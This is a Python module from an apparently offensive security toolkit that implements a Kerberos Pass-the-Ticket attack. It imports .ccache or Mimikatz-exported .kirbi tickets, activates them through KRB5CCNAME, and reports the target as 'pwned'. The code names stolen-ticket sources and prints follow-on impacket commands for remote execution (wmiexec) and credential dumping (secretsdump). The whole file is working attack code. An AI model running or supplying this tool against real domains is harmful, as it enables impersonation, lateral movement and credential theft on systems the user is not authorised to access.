# scripts/kerberos/tickets/pass_the_ticket.py
#
# Técnica: Pass-the-Ticket (PtT)
#
# Fundamento:
#   En Kerberos, la identidad de un usuario se representa en tickets (.ccache
#   en Linux/macOS, .kirbi / LSASS en Windows). Si tienes el ticket, tienes
#   la identidad — sin necesitar la contraseña.
#
#   La variable de entorno KRB5CCNAME apunta al fichero .ccache que usa el
#   cliente Kerberos del sistema operativo. Cambiándola, cualquier herramienta
#   que use la librería Kerberos del SO (impacket, smbclient, ldapsearch...)
#   usará ese ticket para autenticarse.
#
#   Fuentes de tickets:
#     - Salida de otros scripts de Lobera: overpass-the-hash, golden-ticket...
#     - Volcados de Mimikatz/Rubeus exportados como .kirbi
#     - /tmp/krb5cc_<uid> (ticket por defecto en Linux tras kinit)
#
#   Formatos:
#     .ccache → formato nativo de MIT Kerberos (Linux/macOS/impacket)
#     .kirbi  → formato Windows (exportado por Mimikatz). impacket puede
#               convertir .kirbi → .ccache via KrbCredCCache.parseFile()

import os
import sys
from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db


class PassTheTicketScript(BaseScript):
    name = "pass-the-ticket"
    description = "Importa un ticket .ccache/.kirbi y lo activa para la sesión actual"

    examples = [
        {"flag": "--ccache",
         "desc": "Ruta a un fichero .ccache (formato MIT Kerberos)",
         "good": "kerberos --script=pass-the-ticket --ccache /tmp/admin.ccache",
         "bad": "kerberos --script=pass-the-ticket --ccache /tmp/admin.kirbi  [usa --kirbi para ficheros .kirbi de Windows]"},
        {"flag": "--kirbi",
         "desc": "Ruta a un fichero .kirbi (formato Windows / Mimikatz) — se convierte a .ccache automáticamente",
         "good": "kerberos --script=pass-the-ticket --kirbi /tmp/ticket.kirbi",
         "bad": "kerberos --script=pass-the-ticket --kirbi /tmp/ticket.kirbi --ccache /tmp/ticket.ccache  [no combines ambos]"},
    ]

    def run(self, **kwargs):
        ccache_path = kwargs.get("ccache")
        kirbi_path = kwargs.get("kirbi")

        if not ccache_path and not kirbi_path:
            console.print("[red]Falta --ccache o --kirbi: pass-the-ticket necesita un fichero de ticket.[/red]")
            return

        if ccache_path and kirbi_path:
            console.print("[red]No combines --ccache y --kirbi: usa uno solo.[/red]")
            return

        if kirbi_path:
            ccache_path = self._kirbi_to_ccache(kirbi_path)
            if not ccache_path:
                return

        if not os.path.exists(ccache_path):
            console.print(f"[red]No existe el fichero: {ccache_path}[/red]")
            return

        # Validar que es un .ccache real antes de usarlo
        info = self._inspect_ccache(ccache_path)
        if info is None:
            console.print(f"[red]No se pudo parsear el .ccache: {ccache_path}[/red]")
            return

        # Activar el ticket en el proceso actual
        old_ccname = os.environ.get('KRB5CCNAME', '')
        os.environ['KRB5CCNAME'] = f'FILE:{ccache_path}'

        print_result("KRB", self.target.ip or "local", "pwned",
                     f"Ticket activado: {ccache_path}")
        console.print(f"[green]KRB5CCNAME=[bold]FILE:{ccache_path}[/bold][/green]")
        console.print()

        if info:
            console.print("[bold]Contenido del ticket:[/bold]")
            for field, val in info.items():
                console.print(f"  {field}: [cyan]{val}[/cyan]")

        console.print()
        console.print("[dim]El ticket está activo para este proceso de Python. "
                       "Para usarlo en otras herramientas, exporta la variable:[/dim]")
        console.print(f"  [bold yellow]export KRB5CCNAME=FILE:{ccache_path}[/bold yellow]")
        console.print()
        console.print("[dim]Luego puedes usar, por ejemplo:[/dim]")
        console.print(f"  impacket-smbclient -k -no-pass <hostname>")
        console.print(f"  impacket-wmiexec -k -no-pass <hostname>")
        console.print(f"  impacket-secretsdump -k -no-pass <hostname>")

        session_db.save_finding(
            self.target.ip or "local", "KRB", "ticket_imported",
            f"ccache: {ccache_path} | principal: {info.get('principal', '?')}"
        )

        return {'ccache': ccache_path, 'info': info}

    def _kirbi_to_ccache(self, kirbi_path: str) -> str | None:
        """
        Convierte un .kirbi de Windows a .ccache de MIT Kerberos.
        Usa impacket.krb5.ccache.CCache.loadKirbiFile().
        """
        try:
            from impacket.krb5.ccache import CCache
            ccache = CCache()
            ccache.fromKirbi(open(kirbi_path, 'rb').read())
            out_path = kirbi_path.replace('.kirbi', '.ccache')
            ccache.saveFile(out_path)
            print_result("KRB", self.target.ip or "local", "ok",
                         f"Convertido {kirbi_path} → {out_path}")
            return out_path
        except ImportError:
            console.print("[red]impacket no disponible para convertir .kirbi[/red]")
            return None
        except Exception as e:
            console.print(f"[red]Error convirtiendo .kirbi: {e}[/red]")
            return None

    def _inspect_ccache(self, ccache_path: str) -> dict | None:
        """
        Inspecciona un .ccache y devuelve info básica sobre el ticket.
        """
        try:
            from impacket.krb5.ccache import CCache
            ccache = CCache.loadFile(ccache_path)
            principal = ccache.principal.prettyPrint() if ccache.principal else "?"
            creds = ccache.credentials
            services = []
            for c in creds:
                try:
                    sname = c.header['server'].prettyPrint()
                    services.append(sname)
                except Exception:
                    pass
            return {
                'principal': principal,
                'tickets': len(creds),
                'servicios': ', '.join(services[:3]) + ('...' if len(services) > 3 else ''),
            }
        except Exception:
            # Fallback: verificar que el fichero empieza con el magic del .ccache
            try:
                with open(ccache_path, 'rb') as f:
                    magic = f.read(4)
                if magic[:2] in (b'\x05\x04', b'\x05\x03', b'\x05\x02'):
                    return {'formato': 'ccache (MIT Kerberos)', 'principal': '?'}
                return None
            except Exception:
                return None
